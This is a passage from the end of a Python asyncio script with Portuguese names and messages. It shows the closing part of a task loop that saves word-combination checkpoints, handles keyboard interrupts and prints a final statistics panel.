                                stats.mostrar_painel(controlador.get_concurrency())
                            
                            if stats.contador_total % 100 == 0:
                                salvar_checkpoint(palavra_base, palavra_var1, palavra_var2, stats, modo, controlador.get_concurrency())
            
            if tarefas_pendentes:
                await asyncio.wait(tarefas_pendentes)
        
        except KeyboardInterrupt:
            print("\n\n⚠️  Programa interrompido")
            
            if tarefas_pendentes:
                print("⏳ Aguardando tarefas...")
                await asyncio.wait(tarefas_pendentes)
            
            if 'palavra_base' in locals():
                salvar_checkpoint(palavra_base, palavra_var1, palavra_var2 if modo == "10+2" else None, stats, modo, controlador.get_concurrency())
        
        finally:
            stats.mostrar_painel(controlador.get_concurrency())
            print("\n✅ Programa finalizado!")

if __name__ == "__main__":
    asyncio.run(main())
